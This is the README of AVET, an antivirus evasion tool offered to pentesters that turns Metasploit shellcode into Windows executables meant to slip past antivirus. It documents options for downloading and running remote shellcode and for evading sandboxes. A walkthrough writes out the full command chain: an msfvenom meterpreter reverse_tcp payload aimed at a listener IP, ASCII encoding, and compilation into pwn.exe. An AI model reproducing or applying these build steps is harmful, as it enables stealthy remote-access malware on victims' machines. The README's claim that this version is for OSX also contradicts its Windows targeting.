AntiVirus Evasion Tool
======================

Please note that this project has PoC status!
---------------------------------------------

Blog: https://danielsauder.com/2019/03/21/antivirus-evasion-on-osx/

AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques, this version is for OSX.

For basics about antivirus evasion, AVET & more information have a look here: 
- https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/
- https://govolution.wordpress.com/2017/06/11/avet-video/
- https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
- https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
- https://twitter.com/DanielX4v3r

What & Why:
- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
- avet is a antivirus evasion tool targeting windows machines with executable files
- assembly shellcodes can be used
- make_avet can be used for configuring the sourcecode
- with make_avet you can load ASCII encoded shellcodes from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
- call msf ASCII encoded shellcode as a parameter from cmd
- for ASCII encoding the shellcode the tool format.sh and sh_format are included

Installation
- this version was developed for running on OSX with metasploit and gcc installed
- install python3
	https://www.python.org/downloads/mac-osx/
- install gnureadline
	pip3 install gnureadline

Important Note
--------------
Not all techniques will evade every AV engine. If one technique or build script does not work please test another one.

How to use make_avet and build scripts
--------------------------------------
Compile if needed, for example if you use a 32 bit system:
```
$ gcc -o make_avet make_avet.c
```

The purpose of make_avet is to preconfigure a definition file (defs.h) so that the source code can be compiled in the next step. This way the payload will be encoded as ASCII payload or with encoders from metasploit. You hardly can beat shikata-ga-nai.

Let's have a look at the options from make_avet, examples will be given below:
```
-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin
   when called with -E call with mytrojan.exe shellcode.txt
-f compile shellcode into .exe, needs filename of shellcode file
-u load and exec shellcode from url using internet explorer (url is compiled into executable)
-d download the shellcode file using different techniques
   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)
      usage example: pwn.exe http://yourserver/yourpayload.bin
   -d certutil -> use certutil.exe for downloading the file
   -d powershell -> use powershell for downloading the file
      usage of -d certutil/powershell in combination with -f
      for executing the raw shellcode after downloading
      call: pwn thepayload.bin http://server/thepayload.bin
-E use avets ASCII encryption, often do not has to be used
   Can be used with -l
-F use fopen sandbox evasion
-k "killswitch" sandbox evasion with gethostbyname
-X compile for 64 bit
-p print debug information
-q quiet mode (hide console window)
-h help
```

Of course it is possible to run all commands step by step from command line. But it is strongly recommended to use build scripts or the avet_fabric.py.

The build scripts themselves are written so as they have to be called from within the avet directory:
```
root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.sh
```

Examples
--------
Here are the commented examples for building the .exe files from the build directory. 

```

```

avet_fabric.py
--------------
avet_fabric is an assistant, that loads all build scripts in the build directory (name has to be build*.sh) and then lets the user edit the settings line by line. This is under huge development.

Example:
```
# python3 avet_fabric.py 

                       .|        ,       +
             *         | |      ((             *
                       |'|       `    ._____
         +     ___    |  |   *        |.   |' .---"|
       _    .-'   '-. |  |     .--'|  ||   | _|    |
    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
    |' | |.    |    ||       | |   |  |    ||      |
 ___|  '-'     '    ""       '-'   '-.'    '`      |____
jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

AVET Fabric by Daniel Sauder

avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.

0: build_win32_meterpreter_rev_https_shikata_loadfile.sh
1: build_win32_meterpreter_rev_https_shikata_fopen.sh
2: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
3: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
4: build_win32_meterpreter_rev_https_20xshikata.sh
5: build_win32_meterpreter_rev_https_shikata_load_ie.sh
6: build_win64_meterpreter_rev_tcp.sh
...
Input number of the script you want use and hit enter: 6

Now you can edit the build script line by line.

simple example script for building the .exe file
$ . build/global_win64.sh
make meterpreter reverse payload
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
format the shellcode for make_avet
$ ./format.sh sc.txt > scclean.txt && rm sc.txt
call make_avet, compile
$ ./make_avet -f scclean.txt -X -E
$ $win64_compiler -o pwn.exe avet.c
cleanup
$ rm scclean.txt && echo "" > defs.h

The following commands will be executed:
#/bin/bash
. build/global_win64.sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
./format.sh sc.txt > scclean.txt && rm sc.txt
./make_avet -f scclean.txt -X -E
$win64_compiler -o pwn.exe avet.c
rm scclean.txt && echo "" > defs.h

Press enter to continue.

Building the output file...

Please stand by...

The output file should be placed in the current directory.

Bye...
```


Comparison of Antivirus Evasion tools:
http://dione.lib.unipi.gr/xmlui/bitstream/handle/unipi/11232/Kalogranis_mte1512.pdf
